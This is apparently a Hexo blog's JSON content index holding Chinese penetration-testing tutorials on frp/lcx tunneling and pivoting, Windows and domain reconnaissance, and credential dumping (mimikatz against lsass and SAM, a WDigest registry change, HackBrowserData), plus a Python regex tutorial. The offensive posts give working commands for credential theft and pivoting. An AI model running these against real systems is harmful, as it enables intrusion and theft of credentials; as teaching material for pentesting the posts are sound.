{"meta":{"title":"Ruan❥(^_-) Blog","subtitle":"","description":"","author":"Traveler","url":"https://Ruan0423.github.io","root":"/"},"pages":[{"title":"友情链接","date":"2023-10-28T10:13:57.734Z","updated":"2023-10-28T10:13:57.734Z","comments":true,"path":"links/index.html","permalink":"https://ruan0423.github.io/links/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-10-28T10:13:57.734Z","updated":"2023-10-28T10:13:57.734Z","comments":false,"path":"categories/index.html","permalink":"https://ruan0423.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-10-28T10:13:57.734Z","updated":"2023-10-28T10:13:57.734Z","comments":false,"path":"books/index.html","permalink":"https://ruan0423.github.io/books/index.html","excerpt":"","text":""},{"title":"404 Not Found：该页无法显示","date":"2023-10-28T10:13:57.732Z","updated":"2023-10-28T10:13:57.732Z","comments":false,"path":"/404.html","permalink":"https://ruan0423.github.io/404.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-10-28T10:13:57.736Z","updated":"2023-10-28T10:13:57.736Z","comments":false,"path":"repository/index.html","permalink":"https://ruan0423.github.io/repository/index.html","excerpt":"","text":""},{"title":"关于","date":"2023-10-28T10:13:57.733Z","updated":"2023-10-28T10:13:57.733Z","comments":false,"path":"about/index.html","permalink":"https://ruan0423.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"标签","date":"2023-10-28T10:13:57.736Z","updated":"2023-10-28T10:13:57.736Z","comments":false,"path":"tags/index.html","permalink":"https://ruan0423.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"内网渗透-隧道搭建","slug":"内网渗透-隧道搭建","date":"2023-11-02T10:49:44.000Z","updated":"2023-11-02T14:17:29.556Z","comments":true,"path":"2023/11/02/内网渗透-隧道搭建/","link":"","permalink":"https://ruan0423.github.io/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/","excerpt":"","text":"一、前言为什么要进行代理搭建？因为目标主机会把一些可利用的端口给禁了，或者说内网 的防火墙不允许这些端口出现，那么这时候就需要搭建一个隧道，什么是隧道，对于小白来说可能有点抽象，其实就是主机与攻击机之间的通讯端口，然后还会设计到端口转发或者是端口映射的问题。 端口转发一般发生在一个主机里面，将800端口的流量转到900，而端口映射一般是两个主机，比如访问A主机的800端口就相当于访问B主机的900端口。但对其并没有多大的区分。 这里介绍lcx 和frp的使用。其他不讲。 二、需要搭建代理的场景根据场景的复杂度通常需要设置一级代代理、二级代理….如果目标无公网ip就得使用VPS 1.场景一最简单的场景： 123456攻击机kali内网：web1: 10.10.10.13(内网地址) （192.168.8.x)外网地址DC: 10.10.10.11（不出网）cilent1: 10.10.10.14(内网地址，不出网) 从这可以看到我们如果想要拿下cilent1，可以通过web1主机去。因为kali又不能与cilent1通讯。所以需要搭建代理。 目标 123端口转发：**比如我要控制web1的桌面，需要通过3389来控制，但是防火墙不让外部地址有3389，但是可以4444的话，那我就可以使用端口转发。使得kali访问web1的4444端口就相当于访问3389.。**端口映射：**但是如果我想使用的是cilent的3389，那我可以将cilent的3389映射到web1的4444 1.1 使用lcx进行端口转发web1执行： 1lcx.exe -tran 4444 127.0.0.1 3389 攻击机执行 1rdesktop 192.168.8.x:4444 1.2 使用lcx进行端口映射web1执行： 1lcx.exe -tran 4444 10.10.10.14 3389 攻击机执行 1rdesktop 192.168.8.x:4444 2.场景二但是如果web1没有外网地址（192.168.8.x)，只有内网地址（10.10.10.13），但是出网，可以使用frp以及vps进行搭建隧道。 这种场景搭建一级代理。 假设vps的地址为 43.143.93.88 目标： 123端口转发：我要控制web1的3389，但是我只能允许4444进入。那么就可以将4444的流量转发到3389。想ssh登录进入cilent1 frp搭建一级代理思路。在vps和web1之间搭建一个隧道，搭建这个隧道的时候对于vps会涉及到两个端口。一个是默认的7000连接frp的端口，一个是用户自定义的隧道端口。新手可能会很容易搞混这两个端口。默认的7000端口我们不用在意，只管客户端设置的remote_port. 2.1 使用frp搭建一级代理将Vps作为服务端。把frps上传，并设置frps.ini 123[common]bind_addr = 0.0.0.0bind_port = 7000 web1作为客户端，配置frpc.ini 1234567[common]server_addr = 43.143.93.88aerver_port = 7000[socks5]remote_port = 4444 #vps与web1之间的隧道端口，所有流量都通过vps的4444端口到达web1的4444端口plugin = socks5 #vps可作为一个socks5的代理服务器。 plugin是一个插件，赋值socks5，意思是可以建立socks5代理服务器。什么意思，就是可以把它当做一个中间服务器进行传输。当然你可以都加，plugin &#x3D; socks5。 然后在kali上将数据包流量扔到隧道里面。kali自带proxychains，配置proxychains.conf设置代理服务器: 1socks5 43.143.93.88 4444 再运行 123proxychain rdesktop 10.10.10.13:3389或者proxychain ssh root@10.10.10.14 这个就是把这个数据包的流量扔到vps这个代理服务器上，端口是4444，然后这个流量就会到达目标主机进行解析。 3.场景三假设现在有另外一个主机cilent2 内网地址是10.10.20.5,可以与client1连接。但是我想在攻击机上ssh连接client2. 那么现在就必须再搭条隧道进入cilent1与cilent2所在的网段； 3.1 frp搭建二级代理将vps与web1作为代理服务器 vps的frps配置不变 web1 配置frpc.ini 123456789[common]server_addr = 43.143.93.88aerver_port = 7000[socks5]type = tcp local_port = 10808 #将1080隧道接受到的流量转发到10808,要转发流量，使用tcp协议。所以type=tcpremote_port = 1080plugin = socks5 这样第一条隧道搭建完毕。 同时它也要作为一个代理服务器，那么配置frps.ini,能在web1与cilent1之间建立一个隧道.成为第二条隧道 123[common]bind_addr = 10.10.10.13bind_port = 7000 cilent1配置frpc.ini 12345678[common]server_addr = 10.10.10.13aerver_port = 7000[socks5]type = tcp #为什么要type=tcp,因为在第一条隧道的时候，数据包是tcp协议转发到10808的。remote_port = 10808plugin = socks5 到此两条隧道搭建完毕。 kali攻击kali 可以通过proxchains来实现将流量包转发到vps这个第一个代理服务器，然后就会传到cilent1。 proxychains.conf配置好之后，就可以运行下面命令连接cilent2 1proxychains ssh root@10.10.20.9 三级代理一样的，把cilent2加个frps. 三、frp的其他使用补充frp进行内网穿透的时候，还有其他配置，比如，搭好隧道之后，把流量转发到22端口，就可以连接内网的22，将流量转发到其他部署有网站的端口，就可以通过vps访问到内网网站。但是一定要注意type.想连接22，就走tcp，想web，就可以走tcp也可以http.只不过http还得布置域名。 frps服务端不变。 主要是客户端frpc.ini 12345678910111213[common]server_ip = 43.143.93.88server_port = 7000[ssh]type = tcplocal_port =22remote_port = 1080[web]type = tcplocal_port =80 #或者其他站点端口remote_port = 4444 上述配置就可以直接通过操作43.143.93.88的相应端口来达到相关服务，比如要连接这个客户端的ssh 1ssh -p 1080 root@43.143.93.88 要访问这个客户端内网的网站，直接浏览器访问http://43.143.93.88:4444就能访问。 但是如果是配置了代理服务器，搞了隧道，也就是frpc.ini的配置如下 1234567[common]server_ip = 43.143.93.88server_port = 7000[ssh]remote_port = 1080plugin = socks5 没有type &#x3D; tcp 就不能访问。就算你配置了local_port &#x3D; 22 或者88,都不能成功转发流量，也就是说，要进行端口转发流量必须加上type。 如果没加，就像上面一样，那么就是只搭建了一个代理服务器。 通过代理插件来实现。代理插件kali有proxychain，相关操作也有。代理插件或者软件的作用就是将数据包流量发送到代理服务器。 kali 直接配置文件，使用时就在命令前加上proxychain . Windows可以使用proxifier。在设置代理服务器的时候，就可以设置 43.143.93.88 1080 再设置相应的规则就可以将流量经过代理服务器。","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"代理","slug":"代理","permalink":"https://ruan0423.github.io/tags/%E4%BB%A3%E7%90%86/"}]},{"title":"内网渗透-信息收集(精简详细篇)","slug":"内网渗透-信息收集-精简详细篇","date":"2023-10-30T04:29:45.000Z","updated":"2023-11-01T11:01:39.026Z","comments":true,"path":"2023/10/30/内网渗透-信息收集-精简详细篇/","link":"","permalink":"https://ruan0423.github.io/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/","excerpt":"","text":"一、前言上一篇我们已经讲了在Windows 主机里面信息探测的一些命令，但是有很多很杂，这里就把最常用的列在这里就行。 二、本机基础信息收集12345678910111213141.查看当前用户、权限。whoami /all2.查看网络配置`ipconfig /all`3.查看主机路由信息route print4.查看操作系统信息systeminfo5.查看端口连接信息：netstat -ano6.查看当前会话列表：net session7.查看网络共享信息：net share8.查看已连接的网络共享： net use9.查看当前进程信息：tasklist ,tasklist /svc (可通过这个进行杀软进程识别，)10.查看计划任务：schtasks /query /v /fo list wmic wmic 是微软为了方便管理规范的一个命令行工具，使用它可以获取更多进程和服务的详细信息。 123456789101112131415161718191.获取主机进程信息，并过滤进程的路径，名称和IDwmic process get name ,processid,executablepath2.获取具体某个进程的信息,就加个判断where语句就行wmic process where name=&quot;dwm.exe&quot; get executablepath3.查看服务信息,并过滤出服务的名称，路径，创建时间，运行状态。查看具体某项服务的具体信息和上述一样wmic service get caption,name,pathname,startname,state4.查看系统补丁安装信息，可通过这个来进行提劝收集。这可列出主机补丁列表，包括链接，名称，描述，编号，时间wmic qfe get caption ,csname ,description,hotfixid ,installedon5.查看主机上安装的软件信息，过滤出应用名称和版本wmic product get caption ,version6.查看自启程序信息wmic startup get caption ,command ,location , user 三、域内信息收集域内信息收集首先是判断是否存在域，这不说了，下面介绍常使用的命令： 1234567891011121314151617181920211.net group /domainnet group &quot;xx&quot; /domainnet user /domainnet user &#x27;xx&#x27; /domain2.上面的命令用于收集域内组和用户的信息，另外：wmic useraccount get caption , domain, description可以获得域内所有用户的sid,所属域，描述信息。当然这个命令只能是域用户才能使用。3.查看域内密码策略，有什么用？根据这些密码策略可以构造字典进行爆破net account /domain4.查看域控制器，获取域控制器的主机名net group &quot;domain controllers&quot; /domainnltest /DCLIST:traveler.com 5.知道域域控制器之后，当然还要知道他的地址，使用ping ，可以ping主机名，可以ping域名，当然其实域控基本上就是作为域的DNS服务器，主机的DNS解析就是域的地址。6.然后我们还可以看看域的信任关系，为啥呢？一个用户只能访问自己本地域的信息，但是它想出轨去访问其他域的信息的话就需要建立域信任：nltest /domain_trusts 四、内网资源探测既然主机的信息和域的信息探测差不多了，那么接下来就是探测一下资源啦，这里基本上是通过各种扫描技术来探测，主要为了后续的攻击，探测出主机的操作系统，端口啊，端口上的服务啊，当前的版本的漏洞啊啥的。 1.探测内网存活主机在进行探测之前肯定是先搭建内网代理的，这里就不讲，怎么搭建代理隧道见其他章节。 主机探测主要是通过一些协议，通常是ICMP。NeTBIOS,UDP，ARP，SNMP.SMB .协议很多，所以探索出存活主机的方式有很多。 1.1基于ICMP探测一看到ICMP是吧，就想到ping ，是的，可以使用for 循环ping c段的主机 1for /L %I in (1,1,254) do @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot; 1.2基于NetBIOS (网络基本输入、输出系统) 探测上传nbtscan.exe到目标主机，地址http://unixwiz.net/tools/nbtscan.html 执行nbtscan.exe 10.10.10.0/24 1.3 基于UDP探测kali自带一个 unicornscan ,它使用udp协议探测存活主机 unicornscan -mU 10.10.10.0/24 1.4 基于ARP协议arp-scan 是一个快速扫描工具，很快，kali 自带，Windows需要上传 arp-scan.exe -t 10.10.10.0/24 2.探测端口2.1 telnet 探测telnet ip port 可以检测该端口是否打开 2.2 nmapnmap -sS -p- ip 2.3 获取banner信息banner信息中可能含有一些敏感信息 123nc -nv ip porttelnet ip portnmap --script=banner -p port ip 3.用户凭据收集在内网渗透中，被攻击的主机通常只是作为跳板进行横向渗透，然而横向的一些攻击方法通常需要吸纳获得域内用户的密码。 mimikazt地址https://github.com/gentilkiwi/mimikatz 百度网盘：链接：https://pan.baidu.com/s/166t4E-SfvHyDwuxlfq6wTw提取码：3azc 3.1 获取域内主机的密码和哈希值前言： Windows的密码是存在SAM文件中的，这个文件位于%Systemroot%&#x2F;system32&#x2F;config目录下，这个文件包含了用户的账号密码。在用户登录时会将用户输入的账号密码与这个文件进行匹配。 那是怎么进行匹配的呢？那肯定还是要有进程是吧，这个进程就是lsass.exe ，当用户在登录界面输入账号密码后，这些东西就会存在进程的内存之中，那么好家伙，是不是我只要能读取这个内存那岂不是就OK了，但是这个操作时要权限滴，所以啊，提圈很重要，现在假设有权限了。 有了这么个东西叫做Mimikatz ,Mimikatz 是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限，注入进程，读取进程内存。 接下来要搞主机的密码我们就用这个工具去搞 1.读取lsass进程内存获取密码在线模式： 上传mimikatz到主机，执行 1234mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit#privilege::debug 用于提权至debugprivilege权限，这个权限就可以导出内容了#sekurlsa::logonpasswords 导出用户凭据 离线模式： 离线模式就是，将进程的内容转储在一个文件上，然后再进行导出用户凭据，那么转储的工具有哪些呢？有OutMinidump.ps1、Procdump、sharpdump 。通常使用微软官方提供的prodump 在目标机器上上传prodump 执行 prodump.exe -accepteula -ma lsass.dmp 这样就将lsass内存转储了，然后再执行：mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit #sekurlsa::minidump lsass.dump是加载内存文件 注意： 但是微软在2014年为了防止从内存中提取密码，禁用了WDigest 功能，使得Win sever2012及以上版本默认关闭Wdigest功能；但是可以通过修改注册表开启Wdigest功能，当下次登录或者注销登录的时候就可以重新获得密码： 12345#开启Wdigestreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#关闭WDigestreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 2.读取SAM文件获取密码也是直接使用mimikatz 1234567mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit#privilege::dubug 提权至DebugPrivilege#token：：elevate 提权至system #lsadump:sam 读取本地sam文件 离线： 为了防止SAM被脱裤直接被破解，window设置了秘钥，这个秘钥存在同目录下的SYSTEM文件中，所以要导出这两个文件（SAM和SYSTEM），但是呢这两个文件又是锁定的，又要借助工具才能导出，使用Invoke-NinjaCopy.ps1脚本 12Invoke-NinjaCopy -path &quot;C:\\windows\\system32\\config\\SAM&quot; -LocalDestination C:\\temp\\SAMInvoke-NinCopy -path &quot;C:\\windows\\system32\\config\\SYSTEM&quot; -LocalDestination C:\\temp\\SYSTEM 当然除了工具之外也可以在管理员权限下通过注册表保存的方式： 12reg save HKLM\\SAM sam.hive reg save HKLM\\SYSTEM system.hive 通过上述两个方式导出文件之后继续使用mimikatz来读取明文凭据信息 mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit 五、主机软件中的凭据有一些软件会自动把密码存储，这些密码哎嘿，你懂的。 1.获取PDR远程桌面的凭据也是使用mimikatz来解密。 2.可获取xshell等远程连接工具的密码3.获取浏览器保存的登录密码使用工具HackBrowserData。上传到主机，直接运行即可。 地址：https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.4","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://ruan0423.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"python之re库，正则表达","slug":"python之re库，正则表达","date":"2023-10-29T09:02:41.000Z","updated":"2023-10-29T14:22:46.514Z","comments":true,"path":"2023/10/29/python之re库，正则表达/","link":"","permalink":"https://ruan0423.github.io/2023/10/29/python%E4%B9%8Bre%E5%BA%93%EF%BC%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE/","excerpt":"","text":"一、前言为什么要学re库呢？这里主要学他的正则表达，在编写安全脚本的时候肯定要遇到一些不规则的匹配规则，当然编写爬虫也少不了正则匹配去找到一些具有特殊特征的字符串。因此这是十分必要的，然而。re库使 Python 语言拥有全部的正则表达式功能。我会先介绍一些常见的函数的功能并且举例。后再举例说明。一些常见的情况。当然除了掌握函数的功能，这只是基础，重点是自己会构造pattern。 这里介绍的匹配通俗来讲就是在一段字符串里面找某段字符串（pattern），在re库里面就有re.match()和re.search()等一些函数来找。 一定要会使用编译函数comlie(),find_all(),还有会正则表达格式。 二、re.match()re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。 12规则是re.match(pattern,string,flag) 举例说明： 12345678910import reprint(re.match(&#x27;www&#x27;,&#x27;www.baidu.com&#x27;))print(re.match(&#x27;www&#x27;,&#x27;www.baidu.com&#x27;).span())print(re.match(&#x27;www&#x27;,&#x27;ewwww&#x27;))#输出&lt;re.Match object; span=(0, 3), match=&#x27;www&#x27;&gt; #匹配成功返回一个对象（0,3） #只要起始位置到结束None #起始位置不匹配。返回空 这里就要提到另外一个知识点，我们知道，re.match返回的是一个obj，其中里面包含了span也就是位置，那我要返回匹配到的字符呢？为什么要返回匹配到的字符呢？因为这里的pattern到后面我们是自己设置的一些模式化的字符，比如我们要在一个js文件里面找出url，那么我们就要编写pattern模式，然后返回这个匹配到的模式字符。 所有这里引出来group() group() 当使用正则表达式匹配时，通常会定义一个模式，该模式中包含一个或多个用括号括起来的子表达式，这些子表达式被称为”捕获组”。这些捕获组用于从匹配的文本中提取特定部分。例如，考虑以下示例： 12345678910111213141516171819202122232425262728import retext = &quot;My phone number is 123-456-7890.&quot;# 匹配电话号码的模式，使用捕获组提取区号、中间号和最后四位数字pattern = r&#x27;(\\d&#123;3&#125;)-(\\d&#123;3&#125;)-(\\d&#123;4&#125;)&#x27;match = re.search(pattern, text)if match: full_match = match.group(0) # 整个匹配 area_code = match.group(1) # 第一个捕获组 middle_digits = match.group(2) # 第二个捕获组 last_digits = match.group(3) # 第三个捕获组 print(&quot;Full Match: &quot;, full_match) print(&quot;Area Code: &quot;, area_code) print(&quot;Middle Digits: &quot;, middle_digits) print(&quot;Last Digits: &quot;, last_digits)else: print(&quot;No match.&quot;)#结果Full Match: 123-456-7890Area Code: 123Middle Digits: 456Last Digits: 7890 通俗解释就是：在pattern = r&#39;(\\d&#123;3&#125;)-(\\d&#123;3&#125;)-(\\d&#123;4&#125;)&#39;模式中，有三个捕获组，当匹配到的时候就可以使用group（）返回整个匹配到的内容。使用group（1）就可以返回第一个捕获组。 如果要不区分大小写，就把flag设置为 re.M|re.I 例如 1re.search(pattern, text，re.M|re.I) 三、re.search()OK！到这里基本上已经了解到什么是匹配什么是模式，怎么返回匹配到的内容或者位置。现在引入另外一个常见的就是search 通常我们使用的都是这个去匹配而不是使用match； 12345678910111213141516171819使用规则re.search(pattern,string,flag)与match的区别在于，search是从整个string中查找到pattern，然后返回obj,否则返回none。而match是只从开始找，如果一开始就不匹配那就返回noneimport repattern = &#x27;ww&#x27;string = &#x27;aww&#x27;string2 = &#x27;wwsdgsdww&#x27;match = re.search(pattern,string)match2 = re.search(pattern,string2)print(match)print(match2)print(match.group())#输出&lt;re.Match object; span=(1, 3), match=&#x27;ww&#x27;&gt;&lt;re.Match object; span=(0, 2), match=&#x27;ww&#x27;&gt;ww 四、替换函数re.sub（） 12345678re.sub(pattern, repl, string, count=0, flags=0)参数：- pattern : 正则中的模式字符串。- repl : 替换的字符串，也可为一个函数。- string : 要被查找替换的原始字符串。- count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 举例： 12345678910import repattern = &#x27;ww&#x27;string2 = &#x27;wwsdgsdww&#x27;replace = re.sub(pattern,&quot;okok&quot;,string2)print(replace)#结果okoksdgsdokok 五、编译函数compile()主要作用就是编译，什么意思？就是将pattern进行编译，在不编译pattern之前，我们是直接把pattern放进函数里面的，那样他会自己编译，但是当我们编译了之后就不用直接调用了。 举例： 12345678910111213141516 import re pattern = &#x27;ww&#x27; string2 = &#x27;wwsdgsdww&#x27; replace = re.search(pattern,string2) print(replace) #使用编译 pattern = re.compile(pattern) replace = pattern.search(string2) print(replace) #输出 &lt;re.Match object; span=(0, 2), match=&#x27;ww&#x27;&gt;&lt;re.Match object; span=(0, 2), match=&#x27;ww&#x27;&gt; 六、查找函数find_all()，finditer()与search的区别在于它找到的是多个，返回的是一个列表。 规则： 1234findall(string[, pos[, endpos]])比如：findall(string,0,10) 举例 1234567891011import repattern = &#x27;ww&#x27;string2 = &#x27;wwsdgsdww&#x27;pattern = re.compile(pattern)result = pattern.findall(string2)print(result)#输出[&#x27;ww&#x27;, &#x27;ww&#x27;] finditer和find_all一样。只不过finditer返回的是迭代，而不是列表。需要使用for循环print出来。 七、正则表达式这里很重要，但是知识点又很多，所以看懂就行，建议当要设置匹配某个字符的特征表达式的时候，集合chatgpt来写。 模式 描述 ^ 匹配字符串的开头 $ 匹配字符串的末尾。 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’ [^…] 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。 re* 匹配0个或多个的表达式。 re+ 匹配1个或多个的表达式。 re? 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式 re{ n} 精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。 re{ n,} 匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。 re{ n, m} 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式 a| b 匹配a或b (re) 对正则表达式分组并记住匹配的文本 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (…), 但是不表示一个组 (?imx: re) 在括号中使用i, m, 或 x 可选标志 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志 (?#…) 注释. (?&#x3D; re) 前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 (?&gt; re) 匹配的独立模式，省去回溯。 \\w 匹配字母数字及下划线 \\W 匹配非字母数字及下划线 \\s 匹配任意空白字符，等价于 **[ \\t\\n\\r\\f]**。 \\S 匹配任意非空字符 \\d 匹配任意数字，等价于 [0-9]. \\D 匹配任意非数字 \\A 匹配字符串开始 \\Z 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 \\z 匹配字符串结束 \\G 匹配最后匹配完成的位置。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\n, \\t, 等. 匹配一个换行符。匹配一个制表符。等 \\1…\\9 匹配第n个分组的内容。 \\10 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。 举例： 在前端的代码中找出url： 1234567891011121314151617181920212223242526272829303132333435363738import requests,re# url = &quot;https://ruan0423.github.io/&quot;url = &#x27;https://www.baidu.com&#x27;js_tewxt = requests.get(url).text# print(js_tewxt)pattern_raw = r&quot;&quot;&quot; (?:&quot;|&#x27;) # Start newline delimiter ( ((?:[a-zA-Z]&#123;1,10&#125;://|//) # Match a scheme [a-Z]*1-10 or // [^&quot;&#x27;/]&#123;1,&#125;\\. # Match a domainname (any character + dot) [a-zA-Z]&#123;2,&#125;[^&quot;&#x27;]&#123;0,&#125;) # The domainextension and/or path | ((?:/|\\.\\./|\\./) # Start with /,../,./ [^&quot;&#x27;&gt;&lt;,;| *()(%%$^/\\\\\\[\\]] # Next character can&#x27;t be... [^&quot;&#x27;&gt;&lt;,;|()]&#123;1,&#125;) # Rest of the characters can&#x27;t be | ([a-zA-Z0-9_\\-/]&#123;1,&#125;/ # Relative endpoint with / [a-zA-Z0-9_\\-/]&#123;1,&#125; # Resource name \\.(?:[a-zA-Z]&#123;1,4&#125;|action) # Rest + extension (length 1-4 or action) (?:[\\?|/][^&quot;|&#x27;]&#123;0,&#125;|)) # ? mark with parameters | ([a-zA-Z0-9_\\-]&#123;1,&#125; # filename \\.(?:php|asp|aspx|jsp|json| action|html|js|txt|xml) # . + extension (?:\\?[^&quot;|&#x27;]&#123;0,&#125;|)) # ? mark with parameters ) (?:&quot;|&#x27;) # End newline delimiter&quot;&quot;&quot;pattern_raw = re.compile(pattern_raw,re.VERBOSE)result = pattern_raw.finditer(str(js_tewxt))# print(result)for i in result: print(i.group()) #结果 1&quot;http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u=&#x27;","categories":[{"name":"python","slug":"python","permalink":"https://ruan0423.github.io/categories/python/"}],"tags":[{"name":"代码 python 开发 脚本","slug":"代码-python-开发-脚本","permalink":"https://ruan0423.github.io/tags/%E4%BB%A3%E7%A0%81-python-%E5%BC%80%E5%8F%91-%E8%84%9A%E6%9C%AC/"}]},{"title":"hexo使用小技巧2","slug":"hexo使用小技巧","date":"2023-10-28T11:40:23.000Z","updated":"2023-10-28T12:08:57.825Z","comments":true,"path":"2023/10/28/hexo使用小技巧/","link":"","permalink":"https://ruan0423.github.io/2023/10/28/hexo%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"","text":"1.在博客中加入图片使用语法 1&#123;% asset_img 1.jpg %&#125; 这样hexo会自动渲染1.jpg.，然后1.jpg的位置需要放在同文件名的文件夹中，比如这篇博客叫hexo使用小技巧，那么这张图片就要在这个目录中，如下图所示： 2.对博客进行贴标签分类，在文件中使用123456---tile: 文章主题date: 文章日期categories: 文章分类tags: 标签--- 注意：后还要有空格，不然会编译报错。","categories":[{"name":"说明","slug":"说明","permalink":"https://ruan0423.github.io/categories/%E8%AF%B4%E6%98%8E/"}],"tags":[{"name":"说明","slug":"说明","permalink":"https://ruan0423.github.io/tags/%E8%AF%B4%E6%98%8E/"}]},{"title":"内网渗透-信息收集（常见命令篇）","slug":"内网渗透-信息收集","date":"2023-10-28T05:03:27.000Z","updated":"2023-10-30T04:56:01.463Z","comments":true,"path":"2023/10/28/内网渗透-信息收集/","link":"","permalink":"https://ruan0423.github.io/2023/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"一、前言对于所有的渗透而言，信息收集是最重要的一步，关系着后续的所有进程。对于内网渗透来说，信息收集主要就是对所拿下的一台主机进行信息探索。这里主要介绍一些常用的命令。 二、获得主机的基本信息1.获取主机名hostname 2.获取系统信息systeminfo **3.查看进程信息tasklist ;**这个命令可以查看当前主机运行了哪些进程。 三、域信息收集域信息是必须的，首先判断一台主机是否存在域；基本上net 命令后面执行&#x2F;domain 有域就可以执行成功；比如net time &#x2F;domain.执行成功之后就会看到主域的时间和主域的信息和主机名。 查看域控： net group “domain controllers” 1.ipconfig &#x2F;all 可以看到主机的域信息和ip信息。 2.net group &#x2F;domain 查看域内的组信息。 3.net user &#x2F;domain 查看域用户 4.net group “domain admins” &#x2F;domain 查看域内的管理员。 这里基本上都是使用到net 那就介绍一下net的语法吧 123456789101112131415net user: 用于管理本地计算机上的用户帐户。您可以使用它来创建、修改、删除用户帐户，以及更改用户密码。net group: 用于管理本地计算机上的用户组。它允许您创建、修改和删除用户组，以及管理组成员。net share: 用于管理共享文件夹和打印机。您可以使用它来创建、修改和删除共享，以及查看共享的状态。net view: 用于查看网络上可用的计算机和共享资源列表。它可以帮助您查看网络中的其他计算机。net use: 用于连接到或断开网络共享资源，如文件夹或打印机。您可以使用它来映射网络驱动器，使共享资源在本地计算机上可用。net time: 用于同步计算机的时间与网络时间服务器，以确保计算机的时钟准确。net start 和 net stop: 用于启动或停止 Windows 服务。您可以使用这些命令来管理系统中正在运行的服务。netstat: 用于查看网络连接和统计信息，包括本地和远程计算机之间的网络连接。 四、用户信息域信息收集之后再查看一下当前主机的信息。通常查看当前主机有些什么特权 1234561.whoami /all可以一键查看当前用户的信息和特权2.whoami /priv 只查看特权3.quser 查看在线的用户 五、网络信息1.arp -a 可查看网卡信息 2.netstat -a 监听的端口 3.探测出网情况 1powershell -c &quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#x27;allports.exposed&#x27;,$_)) $_ &#125; 2&gt;$null&quot; 六、防火墙12345查看防火墙状态 netsh advfirewall show allprofiles防火墙日志目录 netsh firewall show logging防火墙规则 netsh advfirewall firewall show rule name=allnetsh firewall show confignetsh firewall show state 七、密码信息，票据信息密码信息，有的密码是保存在浏览器的填充中。 票据信息可以使用cmdkey &#x2F;l klist 